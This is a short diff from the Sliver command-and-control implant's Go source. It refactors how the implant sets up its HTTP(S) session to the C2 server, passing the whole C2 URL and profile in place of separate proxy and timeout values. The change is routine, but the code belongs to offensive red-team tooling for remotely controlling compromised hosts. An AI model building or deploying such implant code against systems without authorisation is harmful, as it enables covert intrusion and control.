@@ -25,7 +25,6 @@ import (
 
 	"net"
 	"net/url"
-	"time"
 
 	"github.com/bishopfox/sliver/implant/sliver/transports"
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
@@ -37,9 +36,8 @@ func SetupConnectionHTTP(c2URI *url.URL, c2 *sliverpb.C2Profile, userCleanup fun
 	// {{if .Config.Debug}}
 	log.Printf("Connecting -> http(s)://%s", c2URI.Host)
 	// {{end}}
-	proxyConfig := c2URI.Query().Get("proxy")
-	timeout := time.Duration(c2.PollTimeout)
-	client, err := HTTPStartSession(c2URI.Host, c2URI.Path, timeout, proxyConfig)
+
+	client, err := HTTPStartSession(c2URI, c2)
 	if err != nil {
 		// {{if .Config.Debug}}
 		log.Printf("http(s) connection error %v", err)
